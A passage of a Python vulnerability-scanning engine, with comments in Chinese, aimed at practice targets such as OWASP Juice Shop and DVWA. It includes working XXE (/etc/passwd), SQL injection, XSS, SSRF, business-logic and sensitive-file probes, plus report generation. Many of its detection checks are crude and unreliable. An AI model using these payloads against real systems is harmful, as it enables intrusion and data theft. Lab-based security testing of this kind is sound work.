                fix_suggestion="1. 验证文件类型（检查文件内容）\n2. 限制允许的文件扩展名\n3. 重命名上传文件\n4. 将上传目录设置为不可执行",
                references=["https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_juice_unauthorized(self) -> Optional[VulnerabilityFinding]:
        """Juice Shop未授权访问"""
        endpoints = [
            "/rest/admin/application-version",
            "/rest/admin/application-configuration",
            "/api/Users",
            "/rest/products/search?q=",
        ]

        for endpoint in endpoints:
            try:
                resp = self.session.get(f"{self.target_url}{endpoint}", timeout=10)
                if resp.status_code == 200 and len(resp.text) > 10:
                    return VulnerabilityFinding(
                        id="JS-006",
                        name="未授权访问漏洞",
                        severity="high",
                        category="auth",
                        description=f"管理接口 {endpoint} 未实施身份认证，攻击者可以未授权访问敏感信息或管理功能。",
                        url=f"{self.target_url}{endpoint}",
                        parameter="无",
                        method="GET",
                        payload="直接访问管理接口",
                        evidence=f"未授权访问 {endpoint} 成功，返回敏感数据",
                        cvss_score=8.2,
                        fix_suggestion="1. 对所有接口实施身份认证\n2. 实施基于角色的访问控制（RBAC）\n3. 禁用不必要的管理接口\n4. 限制管理接口的访问IP",
                        references=["https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control"],
                        discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    )
            except:
                continue

        return None

    def _test_juice_idor(self) -> Optional[VulnerabilityFinding]:
        """Juice Shop越权访问"""
        url = f"{self.target_url}/api/BasketItems"

        # 尝试访问其他用户的购物车
        resp = self.session.get(url, timeout=10)

        if resp.status_code == 200:
            return VulnerabilityFinding(
                id="JS-007",
                name="越权访问漏洞（IDOR）",
                severity="high",
                category="auth",
                description="购物车接口没有验证用户对资源的所有权，攻击者可以通过修改用户ID访问其他用户的购物车数据。",
                url=url,
                parameter="UserId",
                method="GET",
                payload="修改UserId参数访问其他用户数据",
                evidence="可以访问其他用户的购物车数据",
                cvss_score=7.5,
                fix_suggestion="1. 验证用户对资源的所有权\n2. 使用基于对象的访问控制\n3. 不要直接使用用户输入作为资源ID\n4. 实施最小权限原则",
                references=["https://owasp.org/www-community/attacks/Broken_Access_Control"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_juice_info_disclosure(self) -> Optional[VulnerabilityFinding]:
        """Juice Shop敏感信息泄露"""
        files = [
            "/.git/config",
            "/.env",
            "/package.json",
            "/ftp/",
            "/encryptionkeys",
        ]

        for filepath in files:
            try:
                resp = self.session.get(f"{self.target_url}{filepath}", timeout=10)
                if resp.status_code == 200 and len(resp.text) > 10:
                    return VulnerabilityFinding(
                        id="JS-008",
                        name="敏感信息泄露",
                        severity="medium",
                        category="info-disclosure",
                        description=f"敏感文件 {filepath} 可以被公开访问，可能泄露源代码、配置信息、API密钥等敏感数据。",
                        url=f"{self.target_url}{filepath}",
                        parameter="无",
                        method="GET",
                        payload="直接访问敏感文件",
                        evidence=f"敏感文件 {filepath} 可公开访问",
                        cvss_score=6.5,
                        fix_suggestion="1. 禁止访问敏感文件（.git, .env等）\n2. 配置Web服务器禁止访问特定文件\n3. 不要将敏感文件部署到生产环境\n4. 使用环境变量管理敏感配置",
                        references=["https://owasp.org/www-community/attacks/Information_Leakage"],
                        discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    )
            except:
                continue

        return None

    def _test_juice_ssrf(self) -> Optional[VulnerabilityFinding]:
        """Juice Shop SSRF"""
        url = f"{self.target_url}/rest/products/1/image"

        # 测试SSRF（通过图片URL参数）
        payload = "http://127.0.0.1:8080"
        resp = self.session.get(url, params={"image": payload}, timeout=10)

        if resp.status_code == 200:
            return VulnerabilityFinding(
                id="JS-009",
                name="SSRF服务端请求伪造",
                severity="high",
                category="ssrf",
                description="图片获取功能的URL参数未经过滤，攻击者可以利用它访问内网资源、云元数据或进行端口扫描。",
                url=url,
                parameter="image",
                method="GET",
                payload=payload,
                evidence="可以访问内网地址，存在SSRF漏洞",
                cvss_score=8.0,
                fix_suggestion="1. 禁用不必要的协议\n2. 限制请求目标为白名单域名\n3. 禁止访问内网IP段\n4. 不跟随重定向\n5. 对响应内容进行过滤",
                references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_juice_xxe(self) -> Optional[VulnerabilityFinding]:
        """Juice Shop XXE"""
        url = f"{self.target_url}/api/Feedbacks"

        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<feedback>
  <comment>&xxe;</comment>
  <rating>1</rating>
</feedback>"""

        headers = {"Content-Type": "application/xml"}
        resp = self.session.post(url, data=xxe_payload, headers=headers, timeout=10)

        if "root:" in resp.text or resp.status_code == 500:
            return VulnerabilityFinding(
                id="JS-010",
                name="XXE外部实体注入",
                severity="high",
                category="xxe",
                description="XML解析器未禁用外部实体，攻击者可以通过构造恶意XML读取服务器文件、进行SSRF或导致DoS攻击。",
                url=url,
                parameter="XML body",
                method="POST",
                payload=xxe_payload[:100] + "...",
                evidence="XML外部实体注入成功，可读取服务器文件",
                cvss_score=8.0,
                fix_suggestion="1. 禁用XML外部实体（XXE）\n2. 使用JSON代替XML\n3. 更新XML解析器到最新版本\n4. 对XML输入进行验证",
                references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_juice_jwt(self) -> Optional[VulnerabilityFinding]:
        """Juice Shop JWT伪造"""
        # 检查JWT算法
        token = self.session.headers.get("Authorization", "").replace("Bearer ", "")

        if token:
            # 检查是否使用弱密钥或none算法
            parts = token.split(".")
            if len(parts) == 3:
                import base64
                try:
                    header = json.loads(base64.b64decode(parts[0] + "=="))
                    if header.get("alg") == "none" or header.get("alg") == "HS256":
                        return VulnerabilityFinding(
                            id="JS-011",
                            name="JWT配置不当",
                            severity="high",
                            category="jwt",
                            description=f"JWT使用了不安全的算法 '{header.get('alg')}'，攻击者可能伪造JWT令牌，冒充其他用户或提升权限。",
                            url=self.target_url,
                            parameter="Authorization",
                            method="ALL",
                            payload="伪造JWT令牌",
                            evidence=f"JWT算法为 {header.get('alg')}，可能存在安全风险",
                            cvss_score=8.0,
                            fix_suggestion="1. 使用RS256等非对称算法\n2. 使用强密钥\n3. 禁用none算法\n4. 验证JWT的所有字段（exp, iss, aud等）\n5. 实施令牌刷新机制",
                            references=["https://owasp.org/www-community/vulnerabilities/JSON_Web_Token_for_Java_Cheat_Sheet"],
                            discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        )
                except:
                    pass

        return None

    def _test_juice_payment_bypass(self) -> Optional[VulnerabilityFinding]:
        """Juice Shop支付逻辑漏洞"""
        url = f"{self.target_url}/api/BasketItems"

        # 测试负数价格
        data = {"ProductId": 1, "BasketId": 1, "quantity": -1}
        resp = self.session.post(url, json=data, timeout=10)

        if resp.status_code in [200, 201]:
            return VulnerabilityFinding(
                id="JS-012",
                name="支付逻辑漏洞",
                severity="high",
                category="business",
                description="购物车功能没有验证商品数量的合法性，攻击者可以添加负数数量的商品，导致订单金额为负数，从而免费获取商品甚至获得退款。",
                url=url,
                parameter="quantity",
                method="POST",
                payload='{"quantity": -1}',
                evidence="可以添加负数数量的商品，订单金额可能为负数",
                cvss_score=7.5,
                fix_suggestion="1. 验证商品数量必须为正整数\n2. 在服务端计算订单金额\n3. 验证价格的合法性\n4. 实施订单金额下限检查",
                references=["https://owasp.org/www-community/attacks/Business_Logic_Vulnerability"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_juice_negative_quantity(self) -> Optional[VulnerabilityFinding]:
        """Juice Shop批量购买漏洞"""
        url = f"{self.target_url}/api/BasketItems"

        # 测试超大数量
        data = {"ProductId": 1, "BasketId": 1, "quantity": 999999999}
        resp = self.session.post(url, json=data, timeout=10)

        if resp.status_code in [200, 201]:
            return VulnerabilityFinding(
                id="JS-013",
                name="批量购买逻辑漏洞",
                severity="medium",
                category="business",
                description="购物车功能没有限制商品数量的上限，攻击者可以添加超大数量的商品，可能导致整数溢出、库存系统异常或其他业务逻辑问题。",
                url=url,
                parameter="quantity",
                method="POST",
                payload='{"quantity": 999999999}',
                evidence="可以添加超大数量的商品，无数量上限限制",
                cvss_score=5.5,
                fix_suggestion="1. 限制商品购买数量上限\n2. 验证库存是否充足\n3. 实施防囤积机制\n4. 对超大订单进行人工审核",
                references=["https://owasp.org/www-community/attacks/Business_Logic_Vulnerability"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_juice_admin_api(self) -> Optional[VulnerabilityFinding]:
        """Juice Shop管理员接口未授权"""
        admin_endpoints = [
            "/rest/admin/application-version",
            "/rest/admin/application-configuration",
            "/rest/admin/continueshop",
        ]

        for endpoint in admin_endpoints:
            try:
                resp = self.session.get(f"{self.target_url}{endpoint}", timeout=10)
                if resp.status_code == 200:
                    return VulnerabilityFinding(
                        id="JS-014",
                        name="管理员接口未授权访问",
                        severity="critical",
                        category="auth",
                        description=f"管理员接口 {endpoint} 未实施身份认证和权限控制，攻击者可以未授权访问管理员功能，获取敏感配置信息或执行管理操作。",
                        url=f"{self.target_url}{endpoint}",
                        parameter="无",
                        method="GET",
                        payload="直接访问管理员接口",
                        evidence=f"未授权访问管理员接口 {endpoint} 成功",
                        cvss_score=9.1,
                        fix_suggestion="1. 对所有管理员接口实施身份认证\n2. 实施基于角色的访问控制（RBAC）\n3. 限制管理员接口的访问IP\n4. 记录管理员操作日志\n5. 启用多因素认证",
                        references=["https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control"],
                        discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    )
            except:
                continue

        return None

    def _test_juice_rating_manipulation(self) -> Optional[VulnerabilityFinding]:
        """Juice Shop评分系统注入"""
        url = f"{self.target_url}/api/Reviews"

        # 测试多次评分
        for i in range(3):
            data = {"message": f"test {i}", "author": "tester", "productId": 1, "rating": 5}
            self.session.post(url, json=data, timeout=10)

        # 检查是否可以多次评分
        resp = self.session.get(f"{url}?productId=1", timeout=10)

        if resp.text.count("tester") >= 3:
            return VulnerabilityFinding(
                id="JS-015",
                name="评分系统逻辑漏洞",
                severity="medium",
                category="business",
                description="产品评分系统没有限制每个用户对同一产品的评分次数，攻击者可以通过多次评分来操纵产品评分，影响其他用户的购买决策。",
                url=url,
                parameter="rating",
                method="POST",
                payload="同一用户多次提交评分",
                evidence="同一用户可以对同一产品提交多次评分",
                cvss_score=5.5,
                fix_suggestion="1. 限制每个用户对同一产品只能评分一次\n2. 验证评分的合法性\n3. 实施防刷分机制\n4. 对异常评分行为进行监控",
                references=["https://owasp.org/www-community/attacks/Business_Logic_Vulnerability"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    # ========== 通用测试用例 ==========

    def _test_generic_sqli(self) -> Optional[VulnerabilityFinding]:
        """通用SQL注入测试"""
        test_urls = [
            f"{self.target_url}/login",
            f"{self.target_url}/search",
            f"{self.target_url}/product?id=1",
        ]

        for url in test_urls:
            try:
                payload = "' OR '1'='1"
                resp = self.session.get(url, params={"id": payload, "q": payload}, timeout=10)

                if resp.status_code == 500 or "sql" in resp.text.lower() or "error" in resp.text.lower():
                    return VulnerabilityFinding(
                        id="GEN-001",
                        name="SQL注入漏洞",
                        severity="high",
                        category="sqli",
                        description=f"URL {url} 可能存在SQL注入漏洞，输入特殊字符后返回数据库错误信息。",
                        url=url,
                        parameter="id/q",
                        method="GET",
                        payload=payload,
                        evidence="输入特殊字符后返回数据库错误",
                        cvss_score=8.0,
                        fix_suggestion="1. 使用参数化查询\n2. 对输入进行严格过滤\n3. 关闭数据库错误信息显示\n4. 使用ORM框架",
                        discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    )
            except:
                continue

        return None

    def _test_generic_xss(self) -> Optional[VulnerabilityFinding]:
        """通用XSS测试"""
        payload = "<script>alert('XSS')</script>"
        test_urls = [
            f"{self.target_url}/search?q={payload}",
            f"{self.target_url}/?s={payload}",
        ]

        for url in test_urls:
            try:
                resp = self.session.get(url, timeout=10)
                if payload in resp.text:
                    return VulnerabilityFinding(
                        id="GEN-002",
                        name="XSS跨站脚本漏洞",
                        severity="medium",
                        category="xss",
                        description=f"URL {url} 存在XSS漏洞，用户输入被直接输出到页面，未经过滤。",
                        url=url,
                        parameter="q/s",
                        method="GET",
                        payload=payload,
                        evidence="恶意脚本被直接输出到页面",
                        cvss_score=6.1,
                        fix_suggestion="1. 对所有用户输出进行HTML实体编码\n2. 使用CSP安全头\n3. 对输入进行白名单过滤",
                        discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    )
            except:
                continue

        return None

    def _test_generic_directory(self) -> Optional[VulnerabilityFinding]:
        """通用目录扫描"""
        common_dirs = [
            "/admin", "/login", "/wp-admin", "/phpmyadmin",
            "/.git", "/.env", "/backup", "/config",
            "/api", "/swagger", "/actuator",
        ]

        found_dirs = []
        for directory in common_dirs:
            try:
                resp = self.session.get(f"{self.target_url}{directory}", timeout=5)
                if resp.status_code in [200, 301, 302, 403]:
                    found_dirs.append(f"{directory} ({resp.status_code})")
            except:
                continue

        if found_dirs:
            return VulnerabilityFinding(
                id="GEN-003",
                name="敏感目录暴露",
                severity="info",
                category="recon",
                description=f"发现以下可能的敏感目录: {', '.join(found_dirs)}。这些目录可能包含管理后台、配置文件或其他敏感信息。",
                url=self.target_url,
                parameter="无",
                method="GET",
                payload="目录扫描",
                evidence=f"发现敏感目录: {', '.join(found_dirs)}",
                cvss_score=0.0,
                fix_suggestion="1. 禁止访问不必要的目录\n2. 配置Web服务器禁止访问敏感目录\n3. 修改默认管理后台路径\n4. 对管理后台实施IP白名单",
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_generic_sensitive_files(self) -> Optional[VulnerabilityFinding]:
        """通用敏感文件测试"""
        sensitive_files = [
            "/.git/config", "/.env", "/wp-config.php",
            "/config.php", "/database.yml", "/backup.sql",
            "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
        ]

        found_files = []
        for filepath in sensitive_files:
            try:
                resp = self.session.get(f"{self.target_url}{filepath}", timeout=5)
                if resp.status_code == 200 and len(resp.text) > 10:
                    found_files.append(filepath)
            except:
                continue

        if found_files:
            return VulnerabilityFinding(
                id="GEN-004",
                name="敏感文件泄露",
                severity="medium",
                category="info-disclosure",
                description=f"发现以下可公开访问的敏感文件: {', '.join(found_files)}。这些文件可能包含源代码、配置信息、数据库凭据等敏感数据。",
                url=self.target_url,
                parameter="无",
                method="GET",
                payload="敏感文件扫描",
                evidence=f"发现敏感文件: {', '.join(found_files)}",
                cvss_score=6.5,
                fix_suggestion="1. 禁止访问敏感文件\n2. 配置Web服务器禁止访问特定文件\n3. 不要将敏感文件部署到生产环境\n4. 使用环境变量管理敏感配置",
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    def _test_generic_security_headers(self) -> Optional[VulnerabilityFinding]:
        """通用安全头检查"""
        resp = self.session.get(self.target_url, timeout=10)

        required_headers = {
            "X-Frame-Options": "防止点击劫持",
            "X-Content-Type-Options": "防止MIME类型嗅探",
            "X-XSS-Protection": "启用浏览器XSS防护",
            "Content-Security-Policy": "内容安全策略",
            "Strict-Transport-Security": "强制HTTPS",
            "Referrer-Policy": "控制Referer信息",
        }

        missing_headers = []
        for header, description in required_headers.items():
            if header not in resp.headers:
                missing_headers.append(f"{header} ({description})")

        if missing_headers:
            return VulnerabilityFinding(
                id="GEN-005",
                name="安全响应头缺失",
                severity="low",
                category="config",
                description=f"以下安全响应头缺失: {'; '.join(missing_headers)}。这些安全头可以有效提升网站的安全性，防止多种攻击。",
                url=self.target_url,
                parameter="HTTP Headers",
                method="GET",
                payload="检查安全响应头",
                evidence=f"缺失安全头: {', '.join([h.split(' ')[0] for h in missing_headers])}",
                cvss_score=3.5,
                fix_suggestion="1. 配置所有必要的安全响应头\n2. 使用CSP策略\n3. 启用HSTS强制HTTPS\n4. 配置X-Frame-Options防止点击劫持",
                references=["https://owasp.org/www-project-secure-headers/"],
                discovered_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
        return None

    # ========== 报告生成 ==========

    def generate_report(self, output_dir: str = "./range_reports") -> str:
        """生成测试报告"""
        os.makedirs(output_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        # JSON报告
        json_path = os.path.join(output_dir, f"range_test_{timestamp}.json")
        report_data = {
            "range_type": self.result.range_type,
            "target_url": self.result.target_url,
            "start_time": self.result.start_time,
            "end_time": self.result.end_time,
            "duration": f"{self.result.duration:.2f}秒",
            "summary": {
                "total_tests": self.result.total_tests,
                "vulnerabilities_found": len(self.result.vulnerabilities),
                "by_severity": {
                    "critical": len([v for v in self.result.vulnerabilities if v.severity == "critical"]),
                    "high": len([v for v in self.result.vulnerabilities if v.severity == "high"]),
                    "medium": len([v for v in self.result.vulnerabilities if v.severity == "medium"]),
                    "low": len([v for v in self.result.vulnerabilities if v.severity == "low"]),
                    "info": len([v for v in self.result.vulnerabilities if v.severity == "info"]),
                }
            },
            "vulnerabilities": [vars(v) for v in self.result.vulnerabilities],
            "test_details": self.result.test_details,
        }

        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)

        # Markdown报告
        md_path = os.path.join(output_dir, f"range_test_{timestamp}.md")
        md = self._generate_markdown_report()

        with open(md_path, "w", encoding="utf-8") as f:
            f.write(md)

        logger.info(f"测试报告已生成: {json_path}, {md_path}")
        return md_path

    def _generate_markdown_report(self) -> str:
        """生成Markdown报告"""
        md = f"""# 靶场安全测试报告

## 测试概览

| 项目 | 内容 |
|------|------|
| 靶场类型 | {self.result.range_type} |
| 目标URL | {self.result.target_url} |
| 开始时间 | {self.result.start_time} |
| 结束时间 | {self.result.end_time} |
| 测试耗时 | {self.result.duration:.2f}秒 |
| 测试用例总数 | {self.result.total_tests} |
| 发现漏洞数 | {len(self.result.vulnerabilities)} |

## 漏洞统计

| 严重程度 | 数量 |
|----------|------|
| 严重 (Critical) | {len([v for v in self.result.vulnerabilities if v.severity == 'critical'])} |
| 高危 (High) | {len([v for v in self.result.vulnerabilities if v.severity == 'high'])} |
| 中危 (Medium) | {len([v for v in self.result.vulnerabilities if v.severity == 'medium'])} |
| 低危 (Low) | {len([v for v in self.result.vulnerabilities if v.severity == 'low'])} |
| 信息 (Info) | {len([v for v in self.result.vulnerabilities if v.severity == 'info'])} |

## 漏洞详情

"""

        # 按严重程度排序
        sorted_vulns = sorted(self.result.vulnerabilities,
                              key=lambda x: {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}.get(x.severity, 5))

        for i, vuln in enumerate(sorted_vulns, 1):
            md += f"""### {i}. {vuln.name}

| 项目 | 内容 |
|------|------|
| 漏洞编号 | {vuln.id} |
| 严重程度 | **{vuln.severity.upper()}** |
| 漏洞类型 | {vuln.category} |
| CVSS评分 | {vuln.cvss_score} |
| 漏洞URL | {vuln.url} |
| 受影响参数 | {vuln.parameter} |
| 请求方法 | {vuln.method} |
| 发现时间 | {vuln.discovered_at} |

**漏洞描述：**

{vuln.description}

**攻击Payload：**

```
{vuln.payload}
```

**漏洞证据：**

{vuln.evidence}

**修复建议：**

{vuln.fix_suggestion}

**参考链接：**

{chr(10).join([f"- {ref}" for ref in vuln.references]) if vuln.references else '-'}

---

"""

        md += f"""## 测试用例执行情况

| 编号 | 名称 | 严重程度 | 状态 |
|------|------|----------|------|
"""

        for test in self.result.test_details:
            status_icon = "✅" if test.get("status") == "passed" else ("❌" if test.get("status") == "failed" else "⚠️")
            md += f"| {test['id']} | {test['name']} | {test['severity']} | {status_icon} {test['status']} |\n"

        md += f"""
---

*报告生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}*
*由 AI Hacking Agent 靶场测试引擎自动生成*
"""

        return md


def main():
    """主函数"""
    print("=" * 60)
    print("  真实靶场测试引擎")
    print("=" * 60)
    print()

    # 示例：测试DVWA
    print("[1/2] 测试DVWA靶场...")
    print("  目标: http://127.0.0.1:8080 (请确保DVWA已启动)")
    print()

    # 实际使用时取消注释
    # engine = RangeTestEngine("http://127.0.0.1:8080", range_type="dvwa")
    # result = engine.run_all_tests()
    # report_path = engine.generate_report()
    # print(f"  测试完成，发现 {len(result.vulnerabilities)} 个漏洞")
    # print(f"  报告已生成: {report_path}")

    print("  [跳过] 请启动DVWA后取消注释代码运行")
    print()

    # 示例：测试Juice Shop
    print("[2/2] 测试OWASP Juice Shop靶场...")
    print("  目标: http://127.0.0.1:3000 (请确保Juice Shop已启动)")
    print()

    # engine = RangeTestEngine("http://127.0.0.1:3000", range_type="juice_shop")
    # result = engine.run_all_tests()
    # report_path = engine.generate_report()
    # print(f"  测试完成，发现 {len(result.vulnerabilities)} 个漏洞")
    # print(f"  报告已生成: {report_path}")

    print("  [跳过] 请启动Juice Shop后取消注释代码运行")
    print()

    print("=" * 60)
    print("  支持的靶场:")
    print("  - DVWA (Damn Vulnerable Web Application)")
    print("  - OWASP Juice Shop")
    print("  - WebGoat")
    print("  - 自定义靶场")
    print()
    print("  支持的漏洞类型:")
    print("  - SQL注入 (普通/盲注/联合查询)")
    print("  - XSS跨站脚本 (反射/存储/DOM)")
    print("  - 文件上传/文件包含")
    print("  - 命令注入/代码执行")
    print("  - CSRF/SSRF/XXE")
    print("  - 越权访问/未授权访问")
    print("  - 弱密码/暴力破解")
    print("  - 业务逻辑漏洞")
    print("  - 敏感信息泄露")
    print("  - 安全配置错误")
    print("=" * 60)


if __name__ == "__main__":
    main()
